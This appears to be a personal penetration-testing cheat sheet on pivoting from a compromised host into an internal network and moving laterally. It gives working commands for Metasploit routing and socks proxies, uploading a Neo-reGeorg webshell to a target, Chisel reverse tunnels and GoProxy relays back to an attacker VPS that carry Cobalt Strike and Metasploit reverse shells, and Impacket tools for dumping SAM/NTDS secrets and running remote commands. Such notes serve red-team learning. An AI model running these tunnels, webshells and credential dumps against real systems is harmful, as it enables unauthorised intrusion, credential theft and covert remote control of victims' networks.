


## Intranet transverse

> [!conclusion] Tools Comparation
> - `neo-reGeorg`:  Proxifier - fail; Stability - bad
> - `msf`: Proxifier - success; Stability - bad
> - `frp`: Proxifier - success; Stability - good


After gain a MSF session, firstly gather network interface information using `ifconfig`, then ping scan the intranet IP section using `ping_sweep` post module. 
### Socks5 proxy using MSF
Add route to intranet IP section(e.g. `192.168.1.0/24`) by `autoroute` module and bound to the open session. 
Launch a socks proxy by `socks_proxy` module, add the proxy port into *proxychain*'s config. 
To apply proxy to nmap, one must use  `-sT` and `-Pn` option, to use fscan, one should use `-socks5` option of fscan and don't use proxychains instead.
### Socks5 proxy using Neo-reGeorg

> [!NOTE] reGeorg
> reGeorg builds socks5/4 tunnel by webshell, firstly generate a tailored webshell (e.g. tunnel.jsp), upload onto the target server, and run reGeorg script on VPS, which would control tunnel.jsp to create sockets in intranet and build a socks5 tunnel with VPS
> 

```
python3 neoreg.py generate -k O0O0 
# upload payload.jsp onto target xxx:8082
python3 neoreg.py -k O0O0 -p 8001 -u http://xxx:8082/404.jsp
# set socks5 proxy on 8001 port
```
### Port transversion using Chisel
> Denote my attack VPS as vps, the compromised machine as "first hop" and an intranet host as B. Chisel server will run on vps and chisel  client run on target machine.
#### Forward connection
Which means client use server as proxy.
On vps:
```
chisel server --authfile ./chisel_auth.json -p 8101
```
On first hop:
```
.\chisel.exe client --auth "<user:pass>" <vps-ip>:8101 9999:www.baidu.com:80
```
First hop would listen on port 9999 and transfer TCP traffic on port 9999 to chisel server which would transfer the traffic to "www.baidu.com:80" and reply client with response received.

> [!NOTE] 
> So in the forward connection scenario, the client option "\<local-host>:\<local-port>:\<remote-host>:\<remote-port>/\<protocol>" would be parsed as:
>  - **local-host/port** is in terms of the machine client runs on;
>   - **remote-host/port** stands for the destination which client wants chisel server to visit.
>   
> In forward connection scenario, the common action is that run server on the first hop and run client on vps

#### Reverse connection
Which will act as a reverse proxy.
On vps:
```
chisel server --authfile ./chisel_auth.json -p 8101 --reverse
```
On first hop:
```
.\chisel.exe client --auth "<user:pass>" <vps-ip>:8101 R:9999:localhost:8888
.\chisel.exe client --auth "<user:pass>" <vps-ip>:8101 R:9999:<B-ip>:80
```
Chisel server will open 9999 port to listen, first hop will transfer TCP traffic to its 8888 port or an intranet host.
> [!NOTE] 
> So in the reverse connection scenario, the client option "\<local-host>:\<local-port>:\<remote-host>:\<remote-port>/\<protocol>" would be parsed as:
>  - **local-host/port** is in terms of the port chisel server listens on.
>   - **remote-host/port** stands for the destination which expected to visit by chisel client.

#### Socks proxy
On vps:
```
chisel server --authfile ./chisel_auth.json -p 8101 --reverse
```
On first hop:
```
.\chisel.exe client --auth "<user:pass>" <vps-ip>:8101 R:9999:socks
```
VPS will open port 9999 as a socks5 proxy for the intranet first hop located in.

## Lateral Movement
### Expose intranet host, Connect CS Beacon
CS Beacon can configurate a http proxy.
Use `GoProxy` tool, set up a http proxy on edge host:
```
./proxy http -t tcp -p "0.0.0.0:8888"  --log proxy8888.log
```
set up beacon proxy to 8888 port of edge host with intranet address.
### Expose intranet host, MSF reverse connect
MSF reverse shell cannot use http proxy, so we should make a TCP tunnel on the first hop machine. By the command below, the machine will transfer TCP traffic on port 33080 towards your VPS port 8888, and then start a handler on 8888 port for the reverse connection.
```
./proxy tcp -p ":33080" -T tcp -P "<vps ip>:8888"
```


### Impacket
Get an semi-interactive shell, upload/download files: `smbclient.py`
Dump SAM of DIT file: `secretsdump.py`
Execute command: 
	- `psexec.py`
	- `wmiexec.py`: should run as administrator
Get OS architecture: `wmic os get osarchitecture` or `echo %PROCESSOR_ARCHITECTURE%`
